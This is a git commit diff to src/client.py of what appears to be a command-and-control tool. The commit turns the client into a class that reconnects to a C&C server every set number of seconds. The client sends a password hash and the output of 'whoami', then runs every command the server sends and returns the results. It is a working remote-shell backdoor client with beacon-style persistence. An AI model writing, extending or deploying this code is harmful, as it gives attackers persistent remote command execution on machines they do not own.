8c59fc4c11c9d0c50ca4aae43ba938facda111c8
Repa, Martin <martin.repa@firma.seznam.cz>
2020-01-09 15:38:48 +0100

    Add support for client trying to connect in intervals

--- src/client.py
+++ src/client.py
@@ -22,19 +22,27 @@ def execute_command(cmd: str):
     return ""
 
 
-async def connect(uri: str, password: str):
-    pass_hash = hash_sha256(password)
+class Client:
+    def __init__(self, password: str, connection_interval: int):
+        self.pass_hash = hash_sha256(password)
+        self.connection_interval = connection_interval
 
-    try:
-        async with websockets.connect(uri) as ws:
-            await ws.send(pass_hash)
-            await ws.send(execute_command("whoami"))
+    async def connection_loop(self, uri: str):
+        while True:
+            await self._connect(uri)
+            await asyncio.sleep(self.connection_interval)
 
-            while True:
-                cmd = await ws.recv()
-                await ws.send(execute_command(cmd))
-    except Exception as e:
-        print(f"Exception {e} occurred.")
+    async def _connect(self, uri: str):
+        try:
+            async with websockets.connect(uri) as ws:
+                await ws.send(self.pass_hash)
+                await ws.send(execute_command("whoami"))
+
+                while True:
+                    cmd = await ws.recv()
+                    await ws.send(execute_command(cmd))
+        except Exception as e:
+            print(f"Exception {e} occurred.")
 
 
 @click.command()
@@ -52,12 +60,20 @@ async def connect(uri: str, password: str):
     type=click.INT,
     help="Port where the running c&c listens",
 )
-def main(server_address: str, port: int):
-    password = "password"
+@click.option(
+    "--connection_interval",
+    "-i",
+    default="60",
+    type=click.INT,
+    help="Interval in seconds in which client tries to connect to c&c server",
+)
+def main(server_address: str, port: int, connection_interval: int):
+    client = Client("password", connection_interval)
+
     uri = f"ws://{server_address}:{port}"
 
     print("Starting client...")
-    asyncio.get_event_loop().run_until_complete(connect(uri, password))
+    asyncio.get_event_loop().run_until_complete(client.connection_loop(uri))
 
 
 if __name__ == "__main__":
